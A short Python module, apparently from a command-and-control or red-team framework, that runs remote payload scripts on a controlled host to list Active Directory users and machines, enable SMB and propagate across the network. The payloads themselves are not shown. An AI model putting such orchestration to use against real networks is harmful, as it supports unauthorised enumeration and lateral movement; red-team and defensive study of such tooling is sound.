from dataManager.repository.userRepository import UserRepository
import logging
import ast

class ADModule:
    def __init__(self, user_repository: UserRepository):
        self.user_repository = user_repository

    async def list_users(self, id: str):
        user = self.user_repository.get_user(id)
        if user is None:
            raise Exception("User not found")
        try:
            ad_users_string = await user.execute("./modules/payloads/ad/payload_ad_list_users.py")
            logging.info(ad_users_string)
            ad_users = ast.literal_eval(ad_users_string)
        except Exception as e:
            logging.error(e)
            raise Exception("Error while listing users")
        logging.info(ad_users)
        return ad_users
    
    async def list_machines(self, id: str):
        user = self.user_repository.get_user(id)
        try:

            ad_machines = ast.literal_eval(await user.execute("./modules/payloads/ad/payload_ad_list_machines.py"))
        except Exception as e:
            logging.error(e)
            raise Exception("Error while listing machines")
        logging.info(ad_machines)
        
        return ad_machines
    
    async def propagate(self, id):
        user = self.user_repository.get_user(id)
        await user.execute("./modules/payloads/ad/payload_ad_enable_smb.py")
        ad_propagate = await user.execute("./modules/payloads/ad/payload_ad_propagate.py")
        logging.info(ad_propagate)
        return ad_propagate